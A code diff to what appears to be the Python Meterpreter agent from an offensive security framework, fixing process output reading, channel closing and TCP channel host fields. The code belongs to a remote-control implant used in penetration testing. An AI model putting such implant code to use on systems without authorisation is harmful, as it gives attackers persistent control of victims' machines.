@@ -667,6 +667,7 @@ class MeterpreterProcess(MeterpreterChannel):
             self.proc_h.kill()
         if self.proc_h.ptyfd is not None:
             os.close(self.proc_h.ptyfd)
+            self.proc_h.ptyfd = None
         for stream in (self.proc_h.stdin, self.proc_h.stdout, self.proc_h.stderr):
             if not hasattr(stream, 'close'):
                 continue
@@ -679,10 +680,13 @@ class MeterpreterProcess(MeterpreterChannel):
         return self.proc_h.poll() is None
 
     def read(self, length):
-        data = ''
+        data = bytes()
+        stderr_reader = self.proc_h.stderr_reader
         stdout_reader = self.proc_h.stdout_reader
-        if stdout_reader.is_read_ready():
-            data = stdout_reader.read(length)
+        if stderr_reader.is_read_ready() and length > 0:
+            data += stderr_reader.read(length)
+        if stdout_reader.is_read_ready() and (length - len(data)) > 0:
+            data += stdout_reader.read(length - len(data))
         return data
 
     def write(self, data):
@@ -1241,6 +1245,21 @@ class PythonMeterpreter(object):
         self.next_process_id += 1
         return idx
 
+    def close_channel(self, channel_id):
+        if channel_id not in self.channels:
+            return False
+        channel = self.channels[channel_id]
+        try:
+            channel.close()
+        except Exception:
+            debug_traceback('[-] failed to close channel id: ' + str(channel_id))
+            return False
+        del self.channels[channel_id]
+        if channel_id in self.interact_channels:
+            self.interact_channels.remove(channel_id)
+        debug_print('[*] closed and removed channel id: ' + str(channel_id))
+        return True
+
     def get_packet(self):
         pkt = self.transport.get_packet()
         if pkt is None and self.transport.should_retire:
@@ -1313,9 +1332,9 @@ class PythonMeterpreter(object):
                     if channel_id in self.interact_channels:
                         proc_h = channel.proc_h
                         if proc_h.stderr_reader.is_read_ready():
-                            data = proc_h.stderr_reader.read()
-                        elif proc_h.stdout_reader.is_read_ready():
-                            data = proc_h.stdout_reader.read()
+                            data += proc_h.stderr_reader.read()
+                        if proc_h.stdout_reader.is_read_ready():
+                            data += proc_h.stdout_reader.read()
                     if not channel.is_alive():
                         self.handle_dead_resource_channel(channel_id)
                         channel.close()
@@ -1337,9 +1356,9 @@ class PythonMeterpreter(object):
                         self.send_packet(tlv_pack_request('stdapi_net_tcp_channel_open', [
                             {'type': TLV_TYPE_CHANNEL_ID, 'value': client_channel_id},
                             {'type': TLV_TYPE_CHANNEL_PARENTID, 'value': channel_id},
-                            {'type': TLV_TYPE_LOCAL_HOST, 'value': inet_pton(channel.sock.family, server_addr[0])},
+                            {'type': TLV_TYPE_LOCAL_HOST, 'value': server_addr[0]},
                             {'type': TLV_TYPE_LOCAL_PORT, 'value': server_addr[1]},
-                            {'type': TLV_TYPE_PEER_HOST, 'value': inet_pton(client_sock.family, client_addr[0])},
+                            {'type': TLV_TYPE_PEER_HOST, 'value': client_addr[0]},
                             {'type': TLV_TYPE_PEER_PORT, 'value': client_addr[1]},
                         ]))
                 elif isinstance(channel, MeterpreterSocketUDPClient):
@@ -1362,7 +1381,6 @@ class PythonMeterpreter(object):
                     self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))
 
     def handle_dead_resource_channel(self, channel_id):
-        del self.channels[channel_id]
         if channel_id in self.interact_channels:
             self.interact_channels.remove(channel_id)
         self.send_packet(tlv_pack_request('core_channel_close', [
@@ -1570,16 +1588,9 @@ class PythonMeterpreter(object):
 
     def _core_channel_close(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
-        if channel_id not in self.channels:
+        if not self.close_channel(channel_id):
             return ERROR_FAILURE, response
-        channel = self.channels[channel_id]
-        status, response = channel.core_close(request, response)
-        if status == ERROR_SUCCESS:
-            del self.channels[channel_id]
-            if channel_id in self.interact_channels:
-                self.interact_channels.remove(channel_id)
-            debug_print('[*] closed and removed channel id: ' + str(channel_id))
-        return status, response
+        return ERROR_SUCCESS, response
 
     def _core_channel_eof(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
